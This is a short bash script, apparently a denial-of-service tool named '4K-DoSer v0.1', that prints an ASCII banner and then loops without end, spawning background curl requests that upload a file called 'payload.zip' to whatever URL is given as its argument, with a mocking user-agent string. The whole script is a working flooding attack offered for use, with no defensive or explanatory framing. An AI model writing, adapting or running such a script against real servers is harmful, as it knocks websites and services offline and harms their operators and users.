#!/bin/bash
clear
echo    '
 ██╗  ██╗██╗  ██╗     ██████╗  ██████╗ ███████╗███████╗██████╗
 ██║  ██║██║ ██╔╝     ██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗
 ███████║█████╔╝█████╗██║  ██║██║   ██║███████╗█████╗  ██████╔╝
 ╚════██║██╔═██╗╚════╝██║  ██║██║   ██║╚════██║██╔══╝  ██╔══██╗
      ██║██║  ██╗     ██████╔╝╚██████╔╝███████║███████╗██║  ██║
      ╚═╝╚═╝  ╚═╝     ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝'
echo '4K-DoSer v0.1 by Chowix40'
echo 'Attacking' $1

#Loop
for (( ; ; ))
do
curl  -s --form "fileupload=@payload.zip" $1 -A '4K-DoSer/1.0 (DoSed by Chowix40 #TANGODOWN | Do not worry I am just testing)' -o null > /dev/null 2>&1 &
done
echo 'Done'
